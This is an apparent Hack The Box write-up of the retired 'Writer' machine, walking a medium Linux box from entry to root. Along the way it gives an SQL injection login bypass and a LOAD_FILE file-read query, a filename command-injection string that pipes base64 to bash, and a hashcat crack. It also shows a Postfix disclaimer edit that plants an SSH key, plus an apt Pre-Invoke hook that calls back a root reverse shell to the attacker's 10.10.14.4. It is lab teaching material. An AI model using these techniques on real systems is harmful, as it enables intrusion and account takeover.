---
layout: post
title: "The House That Wrote Itself"
subtitle: "HTB Writer, where a login form reads its own source code aloud and a help script that signs the mail signs you in as root"
date: 2021-12-18 12:00:00 +0000
description: "A login bypass that turns into a file reader, a filename that turns into a shell, and a mail disclaimer that signs every message and one stolen account."
image: /assets/og/the-house-that-wrote-itself.png
tags: [hackthebox, writeup]
---

Writer is a publishing house, and it never stops handing you a pen. You ask the login form a leading question and it answers with the whole truth, first by letting you in, then by reading its own source code aloud when you press a little harder. The source confesses a second sin: it renames uploaded images by pasting a filename straight into a shell, so you name your file like a command and the server runs it. From there the box is a relay race of borrowed identities. A Django database hands you one user, a mail-signing script run by another user hands you a second, and a config directory one group can write hands the whole machine to root. Nothing here is a memory-corruption miracle. Every single step is a program treating something a stranger typed as an instruction instead of as text, over and over, in five different costumes.

```
        W R I T E R   &   C O.
        ======================
        login:  admin' or 1=1-- -      "come in"
                ' UNION LOAD_FILE(...)  "and here is my diary"
                        |
                        v
        the diary says: i rename your upload with
            mv <your filename> <your filename>.jpg
        so you name the file a command, and mv obeys.
                        |
                        v
        then a mail disclaimer, signed by john,
        signs your key into his account instead.
                        |
                        v
        and a folder that root reads on a timer
        is a folder one group is allowed to write.
                                            筆
```

## 0x01 · the front desk

`nmap -sC -sV` is quiet and tidy. SSH, a web server, and a Samba pair sitting on 139 and 445.

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu
80/tcp  open  http        Apache httpd 2.4.41
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```

The SMB shares (`writer2_project`, `print$`) all want credentials we do not have yet, so they are a note for later. The website is a Flask app for an aspiring author. Directory busting with `feroxbuster` turns up the part that matters, an admin login living at `/administrative`. A login form that nobody linked to is a door somebody forgot to lock, and forgotten doors are where you start.

## 0x02 · the question that answered itself

The form posts a `uname` and a `password`. The oldest probe in the book is to type a quote where a name should go and watch whether the application flinches. It does. So you stop probing and start talking, and the first thing you say is the classic.

```
uname=admin' or 1=1 limit 1;-- -
password=anything
```

Think of the login query as a sentence the server reads to its database. It means to say *find the user whose name is admin and whose password matches*. By closing the quote yourself and adding `or 1=1`, you rewrite the sentence mid-air into *find the user whose name is admin, or just find anybody at all*. The database, which cannot tell your words from its own, shrugs and returns the first row. You are admin. Picture a guard reading a name card through the intercom, except you wrote the card, and you wrote two extra lines under the name that the guard reads out just as obediently.

Logging in is nice. Reading the server's mind is better. The same injection point is a UNION injection, and the database account carries the `FILE` privilege, which is the keys to the filesystem. You line up the right number of columns and ask it to read files off disk with `LOAD_FILE`.

```
uname=' UNION SELECT 1,LOAD_FILE('/var/www/writer.htb/writer/__init__.py'),3,4,5,6-- -
```

`/etc/passwd` falls out first, naming the humans on the box (`john`, `kyle`). Then the application's own source, `__init__.py`, prints itself into the page. The login form is now reading its own diary aloud, and the diary names the next mistake before we even go looking.

## 0x03 · the filename that was a command

The source shows how uploaded story images get handled. The app downloads whatever image URL you give it, then renames the saved file to end in `.jpg`. The rename is the wound.

```python
os.system("mv {} {}.jpg".format(filename, filename))
```

`os.system` does not run a tidy `mv`. It spawns a shell and hands it that whole string, and a shell treats a semicolon as *and now do this next thing*. So the filename is not a label here. It is the first half of a command line, and you get to write the second half. Think of it like a printer that names every document by reading the title bar out loud to a butler who carries out anything he hears. Name your document `photo; burn the kitchen` and the butler files the photo and then walks to the kitchen.

You hand the app a `file://` URL pointing at a filename you control, and you stuff that filename with metacharacters. The base64 keeps the quotes and pipes from getting mangled on the way through the form.

```
filename:  test.jpg; echo <base64 of payload>|base64 -d|bash;
payload:   [ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]
```

When `mv` chews on that, the shell sees the semicolon, finishes the harmless rename, and then dutifully runs the second clause. A listener catches the call.

```
$ nc -lvnp 443
connect to [10.10.14.4] from writer.htb 10.10.11.101
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Same disease as section 0x02 in a different organ. SQL injection mixed your words into a database sentence. This mixes your words into a shell command. Both are the one bug that never dies, a program that cannot tell its instructions from your input.

## 0x04 · the second tenant

`www-data` is a doormat, not a key. But this box has a second web app, a Django project, and Django keeps its secrets in plaintext config and its users in a database. Reading the project's `settings.py` gives the database login, and the database holds a user record for `kyle`.

```
$ python3 manage.py dbshell
MariaDB [dev]> select username, password from auth_user;
kyle | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4...
```

A `pbkdf2_sha256` hash is not reversible, but it does not have to be. You guess a million words and hash each one the same way until a hash matches. `hashcat` in mode 10000 does exactly that against `rockyou`.

```
$ hashcat -m 10000 kyle.hash /usr/share/wordlists/rockyou.txt
...$260000$...:marcoantonio
```

`kyle:marcoantonio`. The password works over SSH, and `user.txt` is the first flag.

```
kyle@writer:~$ cat user.txt
████████████████████████████████
```

## 0x05 · the disclaimer that signed you in

`kyle` cannot become root, but look at the groups he is in. He belongs to `filter`, and that group owns the write bit on a file the mail system runs on every message, `/etc/postfix/disclaimer`. That file is the little script that staples a legal footer onto outgoing mail. Postfix's config decides who runs it.

```
$ grep disclaimer /etc/postfix/master.cf
... user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
```

Read that `user=john` and feel the floor tilt. Every time mail flows through, the box runs that script *as john*, and `kyle` is allowed to rewrite the script. So you do not need john's password. You need john's hands for one second, and the mail server lends them to you. Picture an office where every letter passes through a stamping machine that stamps in the boss's name. You are the janitor, but you are allowed to change what the stamp says. So you change the stamp to *copy my house key into the boss's pocket*, then drop one letter in the slot.

Append a line to the disclaimer that writes your own key into john's account, then send a single local email to trip it.

```
kyle@writer:~$ echo 'echo "<your ssh pubkey>" >> /home/john/.ssh/authorized_keys' >> /etc/postfix/disclaimer
kyle@writer:~$ swaks --to john@writer.htb --from kyle@writer.htb \
    --server 127.0.0.1 --body "hello"
```

The mail flows, the stamping machine runs as john, your key lands in his `authorized_keys`, and you SSH straight in.

```
$ ssh -i iceberg_ed25519 john@10.10.11.101
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```

## 0x06 · the folder root reads on a timer

`john` is in the `management` group, and that group can write to a directory you would never want a stranger near, `/etc/apt/apt.conf.d/`. Meanwhile a root cron job runs `apt-get update` every couple of minutes.

```
john@writer:~$ find / -group management 2>/dev/null
/etc/apt/apt.conf.d
```

Here is the trap that apt lays for itself. Config files in that directory can define a `Pre-Invoke` hook, a command apt runs *before it does anything else*, and apt runs as root. Think of it like a checklist taped to the front of a manager's binder. The manager reads the checklist out loud and does each item before starting work. You cannot do the manager's job, but you can write on the checklist, and you write *first, hand the building to me*.

Drop a one-line config that fires a callback, then wait for the next tick of the cron.

```
john@writer:~$ echo 'apt::Update::Pre-Invoke {"[ reverse shell back to 10.10.14.4:443 ]"};' \
    > /etc/apt/apt.conf.d/000-iceberg
```

Within two minutes root runs its update, reads your checklist item first, and calls home.

```
$ nc -lvnp 443
connect to [10.10.14.4] from writer.htb 10.10.11.101
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

## 0x07 · the honest caveat

Writer never gets exotic, and that is the point worth taking home. Five times in a row a program could not tell the difference between something a person typed and something the program was supposed to do. The login form read your `or 1=1` as logic. The image renamer read your filename as a command. The mail stamper read a script kyle was allowed to edit, but ran it with john's authority. The apt updater read a hook john was allowed to write, but ran it as root. Different services, different languages, one identical failure, the line between data and instruction left undrawn.

The two privilege steps are the ones I would lose sleep over, because there is no CVE to patch on either. The postfix disclaimer ships green. Nothing is unpatched. An admin simply granted a group write access to a script that another, more powerful account executes, and that gap is a privilege escalation hiding inside an org chart. The apt hook is the same shape wearing different clothes, a trusted directory that the wrong people could write into, read by a process that runs as root. You cannot `apt upgrade` your way out of either one. You fix them by asking, for every file a privileged process trusts, exactly who is allowed to write it. Usually the honest answer is fewer people than the permissions admit.

## 0x08 · outro

```
the form let you in, then read you its diary.
the diary named a filename it would run as a command.
a mail stamp signed your key in someone else's name.
a checklist root reads first was a checklist you could write.

five doors, none of them forced. each one confused
a thing you said with a thing it was told to do.

draw the line. ask who can write. wear black.

                                                            EOF
```

---

*HTB: Writer, retired 11 Dec 2021. A medium Linux box that is really one lesson told five times, that the gap between data and instruction is the only door that ever matters. The relay still runs in a lab and nowhere you don't own.*